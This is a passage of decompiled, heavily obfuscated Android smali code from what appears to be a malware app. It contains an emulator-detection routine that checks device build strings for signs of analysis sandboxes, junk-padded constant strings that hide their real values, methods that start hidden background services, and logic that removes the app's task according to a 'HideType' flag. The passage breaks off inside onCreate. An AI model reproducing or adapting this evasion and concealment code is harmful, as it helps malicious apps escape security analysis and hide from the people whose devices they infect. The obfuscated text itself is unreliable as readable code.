    const-string v2, "escapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u094058"

    invoke-static {v1, v2}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->mgfygdjngvynnbwluynhxpwaysvprsspmrwqaasxcyscwranrq53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    const-string v3, "generic"

    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    .line 468
    invoke-static {v1, v2}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->mgfygdjngvynnbwluynhxpwaysvprsspmrwqaasxcyscwranrq53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    const-string v1, "unknown"

    .line 469
    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    const-string v1, "goldfish"

    .line 470
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    const-string v1, "ranchu"

    .line 471
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v1, "google_sdk"

    .line 472
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v3, "Emulator"

    .line 473
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v3, "Android SDK bescapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u094058uilt for x86"

    .line 474
    invoke-static {v3, v2}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->mgfygdjngvynnbwluynhxpwaysvprsspmrwqaasxcyscwranrq53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v3, "Genymotion"

    .line 475
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v3, "sdk_google"

    .line 476
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    .line 477
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "sdk"

    .line 478
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "sdk_x86"

    .line 479
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "sdk_gphone6escapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u0940584_arm64"

    .line 480
    invoke-static {v1, v2}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->mgfygdjngvynnbwluynhxpwaysvprsspmrwqaasxcyscwranrq53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "vbox86p"

    .line 481
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "emulator"

    .line 482
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "simulator"

    .line 483
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v0, 0x1

    :goto_1
    return v0
.end method

.method private isinternetOK(Landroid/content/Context;)Z
    .locals 1

    const-string v0, "connectivity"

    .line 282
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/net/ConnectivityManager;

    .line 283
    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 284
    invoke-virtual {p1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method


# virtual methods
.method public Work(Landroid/content/Context;)V
    .locals 3

    .line 334
    :try_start_0
    const-class v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny71;

    invoke-static {v0, p1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny70;->notuknucwjfaogtuochbvfgkugoexwtcgsiwaxhcqozfuaeqideap54(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 335
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny71;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 337
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 341
    :cond_0
    const-class v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/asutbmomaeefxtlqfuytwyqiqwcjwovgvxuzzeksuyivrgnhwe38;

    invoke-static {v0, p1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny70;->notuknucwjfaogtuochbvfgkugoexwtcgsiwaxhcqozfuaeqideap54(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 342
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/asutbmomaeefxtlqfuytwyqiqwcjwovgvxuzzeksuyivrgnhwe38;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 343
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_1

    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->NeedNotifi()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 345
    invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 348
    :cond_1
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    :goto_0
    return-void
.end method

.method public finish()V
    .locals 2

    .line 1198
    sget-boolean v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/asutbmomaeefxtlqfuytwyqiqwcjwovgvxuzzeksuyivrgnhwe38;->echo:Z

    if-eqz v0, :cond_0

    .line 1201
    sget-object v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->AA:Ljava/lang/String;

    const-string v1, " "

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/asutbmomaeefxtlqfuytwyqiqwcjwovgvxuzzeksuyivrgnhwe38;->ppjqypegmusvyoukqvwfhmfvidrprjwgzabmmayvgnppcpjada52(Ljava/lang/String;[B)V

    .line 1203
    :cond_0
    sget-object v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny71;->HideType:Ljava/lang/String;

    const-string v1, "K"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 1205
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_1

    .line 1206
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 1208
    :cond_1
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x1

    if-ne p1, v0, :cond_2

    .line 68
    iget-object p1, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mUploadMessage:Landroid/webkit/ValueCallback;

    if-eqz p1, :cond_2

    if-eqz p3, :cond_2

    const/4 p1, -0x1

    if-eq p2, p1, :cond_0

    goto :goto_1

    .line 73
    :cond_0
    invoke-virtual {p3}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object p1

    const/4 p2, 0x0

    if-eqz p1, :cond_1

    new-array p3, v0, [Landroid/net/Uri;

    const/4 v0, 0x0

    .line 76
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    aput-object p1, p3, v0

    goto :goto_0

    :cond_1
    move-object p3, p2

    .line 79
    :goto_0
    iget-object p1, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mUploadMessage:Landroid/webkit/ValueCallback;

    invoke-interface {p1, p3}, Landroid/webkit/ValueCallback;->onReceiveValue(Ljava/lang/Object;)V

    .line 80
    iput-object p2, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mUploadMessage:Landroid/webkit/ValueCallback;

    nop

    :cond_2
    :goto_1
    return-void
.end method

.method public onBackPressed()V
    .locals 1

    .line 1175
    :try_start_0
    iget-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 1176
    iget-object v0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    .line 1178
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 1181
    :catch_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 19

    move-object/from16 v0, p0

    const-string v1, "tr"

    const-string v2, "en"

    const-string v3, "cn"

    const-string v4, "ar"

